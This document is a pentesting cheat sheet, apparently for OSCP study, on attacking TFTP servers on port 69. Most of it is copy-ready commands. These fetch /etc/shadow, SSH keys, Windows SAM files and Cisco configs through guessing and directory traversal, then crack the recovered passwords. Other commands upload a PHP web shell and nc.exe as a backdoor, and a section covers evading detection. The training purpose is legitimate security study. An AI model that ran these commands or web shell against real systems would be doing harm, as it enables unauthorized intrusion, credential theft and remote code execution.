# Port 69 - TFTP Enumeration & Exploitation

## Service Information

**Port:** 69/UDP
**Service:** TFTP (Trivial File Transfer Protocol)
**Protocol:** Simple file transfer (no authentication)
**Security:** ⚠️ NO AUTHENTICATION, NO ENCRYPTION

---

## 1. Basic Enumeration

### 1.1 Nmap Scan

```bash
# UDP scan (TFTP uses UDP!)
nmap -sU -p 69 -sV TARGET_IP

# TFTP enum script
nmap -sU -p 69 --script tftp-enum TARGET_IP

# Version detection
nmap -sU -p 69 -sV --version-intensity 9 TARGET_IP

# Faster scan
nmap -sU -p 69 -Pn TARGET_IP
```

### 1.2 Service Detection

```bash
# Test TFTP connection
echo "test" | tftp TARGET_IP 69

# Check if service responds
echo "quit" | tftp TARGET_IP
```

---

## 2. Manual Enumeration

### 2.1 TFTP Client Connection

```bash
# Connect to TFTP server
tftp TARGET_IP

# TFTP commands:
tftp> ?                # Help
tftp> status          # Show status
tftp> connect TARGET  # Connect to server
tftp> get filename    # Download file
tftp> put filename    # Upload file
tftp> quit           # Exit
```

### 2.2 File Download

```bash
# Download file via TFTP
tftp TARGET_IP <<EOF
get filename
quit
EOF

# Or one-liner
echo "get filename" | tftp TARGET_IP

# Specify mode (binary/ascii)
tftp TARGET_IP <<EOF
binary
get file.bin
quit
EOF
```

### 2.3 File Upload

```bash
# Upload file to TFTP
echo "test content" > test.txt
tftp TARGET_IP <<EOF
put test.txt
quit
EOF

# Upload binary file
tftp TARGET_IP <<EOF
binary
put payload.exe
quit
EOF
```

---

## 3. File Enumeration/Bruteforce

### 3.1 Guess Common Filenames

```bash
# Common config files to try
cat > tftp_files.txt << EOF
config.cfg
running-config
startup-config
config.txt
backup.cfg
router.cfg
switch.cfg
.bash_history
.ssh/id_rsa
.ssh/authorized_keys
/etc/passwd
/etc/shadow
EOF

# Try downloading each file
for file in $(cat tftp_files.txt); do
  echo "Trying: $file"
  tftp TARGET_IP <<EOF
get $file
quit
EOF
done
```

### 3.2 Nmap TFTP Enumeration

```bash
# Brute force filenames
nmap -sU -p 69 --script tftp-enum --script-args tftp-enum.filelist=tftp_files.txt TARGET_IP
```

### 3.3 Metasploit TFTP Bruteforce

```bash
msfconsole
use auxiliary/scanner/tftp/tftpbrute
set RHOSTS TARGET_IP
set DICTIONARY /usr/share/seclists/Discovery/TFTP/tftp.txt
run
```

---

## 4. Cisco/Network Device Enumeration

### 4.1 Cisco Configuration Files

```bash
# Common Cisco TFTP files
tftp TARGET_IP <<EOF
get running-config
get startup-config
get config.text
get private-config.text
get vlan.dat
quit
EOF

# Router configs
tftp TARGET_IP <<EOF
get rtr-config
get router.cfg
quit
EOF
```

### 4.2 Extract Cisco Passwords

```bash
# After downloading config
cat running-config | grep -i password
cat running-config | grep -i enable
cat running-config | grep -i secret

# Crack Cisco Type 7 passwords (weak encryption)
# Example: password 7 02050D480809
# Use: https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html

# Or john the ripper
john --format=cisco-type7 hashes.txt
```

---

## 5. Exploitation Techniques

### 5.1 Configuration File Exfiltration

```bash
# Download sensitive files
tftp TARGET_IP <<EOF
get /etc/passwd
get /etc/shadow
get config.php
get database.yml
get web.config
quit
EOF

# Network device configs
tftp TARGET_IP <<EOF
get running-config
get startup-config
quit
EOF
```

### 5.2 Malicious File Upload

**⚠️ Only in authorized pentests!**

```bash
# Upload web shell (if TFTP root is web directory)
echo '<?php system($_GET["cmd"]); ?>' > shell.php
tftp TARGET_IP <<EOF
put shell.php
quit
EOF

# Then access: http://TARGET_IP/shell.php?cmd=whoami

# Upload backdoor
tftp TARGET_IP <<EOF
put nc.exe
quit
EOF
```

### 5.3 PXE Boot Exploitation

```bash
# If TFTP is used for PXE boot:
# 1. Download boot files
tftp TARGET_IP <<EOF
get pxelinux.0
get pxelinux.cfg/default
quit
EOF

# 2. Analyze boot configuration
cat pxelinux.cfg/default

# 3. May contain:
# - NFS mount credentials
# - Kernel parameters
# - Root passwords in kernel cmdline
```

---

## 6. Directory Traversal

### 6.1 Test for Directory Traversal

```bash
# Try path traversal
tftp TARGET_IP <<EOF
get ../../../etc/passwd
quit
EOF

# Different variations
tftp TARGET_IP <<EOF
get ..\..\..\..\windows\system32\config\sam
quit
EOF

# Null byte injection (older versions)
tftp TARGET_IP <<EOF
get ../../../etc/passwd%00.txt
quit
EOF
```

---

## 7. Common Vulnerabilities

### 7.1 CVE-2019-9516 (TFTP Server DoS)

```bash
# TFTP vulnerabilities are often DoS-related
# Check version first
nmap -sU -p 69 -sV TARGET_IP
```

### 7.2 Weak File Permissions

```bash
# Many TFTP servers allow:
# - World-readable files
# - World-writable directories
# - No access control

# Test write permissions
echo "test" > test.txt
tftp TARGET_IP <<EOF
put test.txt
quit
EOF

# If successful, server allows uploads!
```

---

## 8. Metasploit Modules

### 8.1 TFTP File Bruteforce

```bash
msfconsole
use auxiliary/scanner/tftp/tftpbrute
set RHOSTS TARGET_IP
set DICTIONARY /usr/share/seclists/Discovery/TFTP/tftp.txt
run
```

### 8.2 TFTP Directory Traversal

```bash
use auxiliary/admin/tftp/tftp_transfer_util
set RHOST TARGET_IP
set ACTION GET
set FILENAME ../../../etc/passwd
run
```

---

## 9. Post-Exploitation

### 9.1 Credential Extraction

```bash
# After downloading configs/files:

# Search for passwords
grep -r "password" downloaded_files/
grep -r "passwd" downloaded_files/
grep -r "secret" downloaded_files/
grep -r "key" downloaded_files/

# Common credential locations:
# - Database configs (config.php, database.yml)
# - Network device configs (running-config)
# - Application configs (.env, web.config)
```

### 9.2 Network Mapping

```bash
# Cisco configs may reveal:
cat running-config | grep "ip address"
cat running-config | grep "interface"
cat running-config | grep "ip route"

# Extract network topology
cat running-config | grep -E "ip|interface|route|neighbor"
```

---

## 10. Defense Evasion

### 10.1 Slow Enumeration

```bash
# Add delays between requests
for file in $(cat files.txt); do
  tftp TARGET_IP <<EOF
get $file
quit
EOF
  sleep 5
done
```

### 10.2 Legitimate Traffic Blending

```bash
# TFTP is often used for:
# - PXE boot
# - Cisco/network device backups
# - VoIP phone configs

# Blend in by using common filenames
# Like SEP<MAC>.cnf.xml for Cisco phones
```

---

## 11. Tools Overview

| Tool | Purpose | Command |
|------|---------|---------|
| tftp client | Manual access | `tftp TARGET_IP` |
| Nmap | Service detection | `nmap -sU -p 69 --script tftp-enum TARGET` |
| Metasploit | Automated bruteforce | `use auxiliary/scanner/tftp/tftpbrute` |
| atftp | Advanced TFTP client | `atftp -g -r filename TARGET_IP` |

---

## 12. Advanced TFTP Clients

### 12.1 atftp (Advanced TFTP)

```bash
# Install
sudo apt install atftp

# Download file
atftp -g -r filename TARGET_IP 69

# Upload file
atftp -p -l localfile -r remotefile TARGET_IP 69

# Verbose mode
atftp -v -g -r filename TARGET_IP
```

### 12.2 curl (if supported)

```bash
# Download via curl
curl tftp://TARGET_IP/filename -o output

# Upload via curl
curl -T localfile tftp://TARGET_IP/
```

---

## 13. Quick Reference

### Quick Enumeration
```bash
# UDP scan
nmap -sU -p 69 -sV TARGET_IP

# Enum script
nmap -sU -p 69 --script tftp-enum TARGET_IP

# Manual test
echo "quit" | tftp TARGET_IP
```

### Quick File Download
```bash
tftp TARGET_IP <<EOF
get running-config
get startup-config
get config.cfg
get /etc/passwd
quit
EOF
```

### Quick Bruteforce
```bash
# With Metasploit
use auxiliary/scanner/tftp/tftpbrute
set RHOSTS TARGET_IP
run
```

### Common Files to Try
```
running-config
startup-config
config.cfg
config.txt
backup.cfg
.bash_history
/etc/passwd
/etc/shadow
web.config
config.php
```

---

## 14. OSCP Tips

⚠️ **TFTP Priority for OSCP:**
- **No authentication** = Easy access
- Often overlooked → Quick wins
- Cisco/network configs = Passwords
- Try standard config filenames first
- Test file upload → Web shell if TFTP root = web root
- Look for credentials in configs
- Directory traversal often works

**Common OSCP scenarios:**
1. TFTP on port 69 → Download config files → Credentials
2. Upload web shell via TFTP → RCE
3. Cisco router with TFTP → Download config → Crack passwords
4. PXE boot server → TFTP → Boot configs → NFS credentials

**Quick Win Checklist:**
```bash
# 1. Check if TFTP is open
nmap -sU -p 69 TARGET_IP

# 2. Try common files
tftp TARGET_IP
get running-config
get config.cfg

# 3. Look for passwords
grep -i password *

# 4. Try upload
echo test > test.txt
put test.txt
```

---

## 15. Troubleshooting

```bash
# Connection timeout
# Solution: TFTP uses UDP, may be filtered
nmap -sU -p 69 -Pn TARGET_IP

# File not found
# Solution: Try different filenames/paths
# Use bruteforce list

# Transfer fails
# Solution: Check file permissions
# Try different TFTP client (atftp)

# Upload blocked
# Solution: Server may be read-only
# Try different directories
```

---

## 16. Resources

- **HackTricks TFTP**: https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp
- **TFTP RFC 1350**: https://tools.ietf.org/html/rfc1350
- **SecLists TFTP**: https://github.com/danielmiessler/SecLists/tree/master/Discovery/TFTP
- **Cisco Type 7 Decoder**: https://www.ifm.net.nz/cookbooks/cisco-type7-password-decrypt.html
